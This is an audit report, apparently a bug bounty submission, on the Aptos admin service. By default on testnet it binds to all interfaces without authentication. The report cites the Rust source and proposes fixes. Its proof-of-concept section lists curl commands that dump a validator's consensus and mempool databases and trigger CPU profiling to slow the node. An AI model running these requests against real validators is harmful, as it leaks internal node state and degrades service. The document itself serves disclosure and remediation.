# Audit Report

## Title
Admin Service Exposes Consensus Database and Internal State to Public Internet on Testnet Validators (Default Configuration)

## Summary
The Aptos admin service binds to all network interfaces (0.0.0.0) by default and automatically enables itself on testnet with no authentication required. This exposes highly sensitive endpoints including full consensus database dumps, mempool state, and profiling capabilities to any network attacker with access to port 9102.

## Finding Description

The vulnerability exists in the default configuration and initialization logic of the admin service across multiple files:

**1. Default Binding to All Interfaces**

The admin service defaults to binding address "0.0.0.0", which binds to all network interfaces including public-facing ones: [1](#0-0) 

**2. Automatic Enablement on Testnet**

The configuration optimizer automatically enables the admin service for non-mainnet chains (including testnet): [2](#0-1) 

**3. No Authentication Required on Testnet**

The sanitizer only enforces authentication on mainnet, allowing empty authentication configs on testnet: [3](#0-2) 

**4. Authentication Bypass with Empty Config**

When authentication_configs is empty (the default), all requests are automatically authenticated: [4](#0-3) 

**5. Binding to Socket Address**

The service binds to the resolved socket address using standard TCP binding, which respects 0.0.0.0 as all interfaces: [5](#0-4) [6](#0-5) 

**6. Highly Sensitive Exposed Endpoints**

The admin service exposes endpoints that dump consensus-critical internal state: [7](#0-6) 

**Attack Scenario:**

1. Operator deploys testnet validator with default configuration (no admin_service section in config)
2. Node starts and admin service is auto-enabled (via optimizer for testnet)
3. Service binds to 0.0.0.0:9102 (all network interfaces)
4. No authentication is configured (empty authentication_configs)
5. If the validator has a public IP address, attacker can access:
   - `http://PUBLIC_IP:9102/debug/consensus/consensusdb` - Full consensus database dump
   - `http://PUBLIC_IP:9102/debug/consensus/quorumstoredb` - Quorum store database
   - `http://PUBLIC_IP:9102/debug/consensus/block` - Consensus block data
   - `http://PUBLIC_IP:9102/debug/mempool/parking-lot/addresses` - Mempool transactions
   - `http://PUBLIC_IP:9102/profilez` - CPU profiling (causes performance degradation)

## Impact Explanation

This vulnerability qualifies as **CRITICAL** severity under the Aptos bug bounty program criteria:

1. **Consensus/Safety Violations**: Exposing the consensus database reveals validator voting patterns, quorum certificates, and internal consensus state. This information can be used to predict validator behavior, analyze consensus timing, and potentially identify consensus weaknesses.

2. **Validator Node Slowdowns**: The `/profilez` endpoint triggers CPU profiling which causes measurable performance degradation on the validator node, qualifying as "Validator node slowdowns" (High severity minimum).

3. **Significant Protocol Violations**: Exposing internal consensus state and mempool data violates the access control invariant. Internal debugging endpoints should never be accessible to untrusted parties.

4. **Information Disclosure**: Transaction privacy is violated through mempool dumps. Consensus strategy and validator behavior patterns are exposed through database dumps.

The combination of these impacts, especially the consensus state exposure and DoS potential, elevates this to **CRITICAL** severity.

## Likelihood Explanation

**Likelihood: HIGH**

1. **Default Configuration Vulnerable**: Any testnet validator deployed with default configuration (which most operators would use initially) is vulnerable out-of-the-box.

2. **No User Action Required**: The vulnerability activates automatically through the config optimizer - operators don't need to make any mistakes.

3. **Common Deployment Scenario**: Bare-metal and Docker-based testnet deployments (not using Kubernetes Helm charts) are vulnerable by default.

4. **Easy to Exploit**: Attacker only needs:
   - Network access to the validator's public IP
   - Knowledge of default port 9102
   - Simple HTTP GET requests (curl, browser)

5. **Already Deployed**: Existing testnet validators deployed with default configs are likely vulnerable right now.

## Recommendation

Implement defense-in-depth with multiple fixes:

**1. Change Default Binding Address (Immediate Fix)**

Change the default binding address from "0.0.0.0" to "127.0.0.1" (localhost only):

```rust
impl Default for AdminServiceConfig {
    fn default() -> Self {
        Self {
            enabled: None,
            address: "127.0.0.1".to_string(), // Changed from "0.0.0.0"
            port: 9102,
            authentication_configs: vec![],
            malloc_stats_max_len: 2 * 1024 * 1024,
        }
    }
}
```

**2. Enforce Authentication on All Chains**

Extend the sanitizer to require authentication on all chains when enabled:

```rust
impl ConfigSanitizer for AdminServiceConfig {
    fn sanitize(
        node_config: &NodeConfig,
        _node_type: NodeType,
        chain_id: Option<ChainId>,
    ) -> Result<(), Error> {
        let sanitizer_name = Self::get_sanitizer_name();

        if node_config.admin_service.enabled == Some(true) {
            // Require authentication on ALL chains, not just mainnet
            if node_config.admin_service.authentication_configs.is_empty() {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "Must enable authentication for AdminService when enabled.".into(),
                ));
            }
        }

        Ok(())
    }
}
```

**3. Add Configuration Warning**

Log a security warning when admin service is enabled with 0.0.0.0 binding:

```rust
pub fn new(node_config: &NodeConfig) -> Self {
    let config = node_config.admin_service.clone();
    let service_address = config.address.clone();
    
    // Warn if binding to all interfaces
    if service_address == "0.0.0.0" && config.enabled.unwrap_or(false) {
        warn!(
            "AdminService is binding to 0.0.0.0 (all interfaces). \
             This exposes internal endpoints to the network. \
             Consider binding to 127.0.0.1 for localhost-only access."
        );
    }
    
    // ... rest of initialization
}
```

**4. Update Documentation**

Add clear security warnings in the configuration documentation about the risks of binding to 0.0.0.0 and the importance of authentication.

## Proof of Concept

**Setup:**
1. Deploy a testnet validator with default configuration (no admin_service section)
2. Ensure the validator has a public IP address

**Exploitation:**

```bash
# Assuming validator is at PUBLIC_IP
VALIDATOR_IP="<public_ip_address>"

# 1. Verify admin service is accessible (should return 200)
curl -v http://${VALIDATOR_IP}:9102/

# 2. Dump consensus database (highly sensitive)
curl http://${VALIDATOR_IP}:9102/debug/consensus/consensusdb > consensus_db.json

# 3. Dump quorum store database
curl http://${VALIDATOR_IP}:9102/debug/consensus/quorumstoredb > quorum_store.json

# 4. Retrieve mempool parking lot addresses (transaction privacy violation)
curl http://${VALIDATOR_IP}:9102/debug/mempool/parking-lot/addresses

# 5. Trigger CPU profiling (causes DoS)
curl "http://${VALIDATOR_IP}:9102/profilez?duration=60"

# 6. Dump memory allocation stats
curl http://${VALIDATOR_IP}:9102/malloc/stats
```

**Expected Result:**
All endpoints return sensitive data without requiring any authentication. The consensus database dumps reveal internal validator state, voting records, and quorum certificates. The profiling endpoint causes measurable CPU load on the validator.

**Validation Steps:**
1. Start a testnet node with default config
2. Verify admin service is enabled: check logs for "Started AdminService at"
3. Verify binding: `netstat -tulpn | grep 9102` shows binding to 0.0.0.0
4. Access endpoints from external host to confirm public exposure

## Notes

While Kubernetes Helm deployments have `service.validator.enableAdminPort: false` by default, this only prevents the Kubernetes service from exposing the port externally. The application-level vulnerability still exists and affects:

1. Bare-metal deployments
2. Docker/Docker Compose deployments  
3. Non-Kubernetes container deployments
4. Any deployment where the Helm setting is overridden

The issue fundamentally stems from insecure defaults at the application configuration level, which should be fixed regardless of infrastructure-level protections.

### Citations

**File:** config/src/config/admin_service_config.rs (L41-50)
```rust
impl Default for AdminServiceConfig {
    fn default() -> Self {
        Self {
            enabled: None,
            address: "0.0.0.0".to_string(),
            port: 9102,
            authentication_configs: vec![],
            malloc_stats_max_len: 2 * 1024 * 1024,
        }
    }
```

**File:** config/src/config/admin_service_config.rs (L59-82)
```rust
impl ConfigSanitizer for AdminServiceConfig {
    fn sanitize(
        node_config: &NodeConfig,
        _node_type: NodeType,
        chain_id: Option<ChainId>,
    ) -> Result<(), Error> {
        let sanitizer_name = Self::get_sanitizer_name();

        if node_config.admin_service.enabled == Some(true) {
            if let Some(chain_id) = chain_id {
                if chain_id.is_mainnet()
                    && node_config.admin_service.authentication_configs.is_empty()
                {
                    return Err(Error::ConfigSanitizerFailed(
                        sanitizer_name,
                        "Must enable authentication for AdminService on mainnet.".into(),
                    ));
                }
            }
        }

        Ok(())
    }
}
```

**File:** config/src/config/admin_service_config.rs (L84-107)
```rust
impl ConfigOptimizer for AdminServiceConfig {
    fn optimize(
        node_config: &mut NodeConfig,
        _local_config_yaml: &Value,
        _node_type: NodeType,
        chain_id: Option<ChainId>,
    ) -> Result<bool, Error> {
        let mut modified_config = false;

        if node_config.admin_service.enabled.is_none() {
            // Only enable the admin service if the chain is not mainnet
            let admin_service_enabled = if let Some(chain_id) = chain_id {
                !chain_id.is_mainnet()
            } else {
                false // We cannot determine the chain ID, so we disable the admin service
            };
            node_config.admin_service.enabled = Some(admin_service_enabled);

            modified_config = true; // The config was modified
        }

        Ok(modified_config)
    }
}
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L74-87)
```rust
        let service_port = config.port;
        let service_address = config.address.clone();

        // Create the admin service socket address
        let address: SocketAddr = (service_address.as_str(), service_port)
            .to_socket_addrs()
            .unwrap_or_else(|_| {
                panic!(
                    "Failed to parse {}:{} as address",
                    service_address, service_port
                )
            })
            .next()
            .unwrap();
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L136-136)
```rust
            let server = Server::bind(&address).serve(make_service);
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L154-157)
```rust
        let mut authenticated = false;
        if context.config.authentication_configs.is_empty() {
            authenticated = true;
        } else {
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L194-243)
```rust
            (hyper::Method::GET, "/debug/consensus/consensusdb") => {
                let consensus_db = context.consensus_db.read().clone();
                if let Some(consensus_db) = consensus_db {
                    consensus::handle_dump_consensus_db_request(req, consensus_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Consensus db is not available.",
                    ))
                }
            },
            (hyper::Method::GET, "/debug/consensus/quorumstoredb") => {
                let quorum_store_db = context.quorum_store_db.read().clone();
                if let Some(quorum_store_db) = quorum_store_db {
                    consensus::handle_dump_quorum_store_db_request(req, quorum_store_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Quorum store db is not available.",
                    ))
                }
            },
            (hyper::Method::GET, "/debug/consensus/block") => {
                let consensus_db = context.consensus_db.read().clone();
                let quorum_store_db = context.quorum_store_db.read().clone();
                if let Some(consensus_db) = consensus_db
                    && let Some(quorum_store_db) = quorum_store_db
                {
                    consensus::handle_dump_block_request(req, consensus_db, quorum_store_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Consensus db and/or quorum store db is not available.",
                    ))
                }
            },
            (hyper::Method::GET, "/debug/mempool/parking-lot/addresses") => {
                let mempool_client_sender = context.mempool_client_sender.read().clone();
                if let Some(mempool_client_sender) = mempool_client_sender {
                    mempool::mempool_handle_parking_lot_address_request(req, mempool_client_sender)
                        .await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Mempool parking lot is not available.",
                    ))
                }
            },
            _ => Ok(reply_with_status(StatusCode::NOT_FOUND, "Not found.")),
        }
```
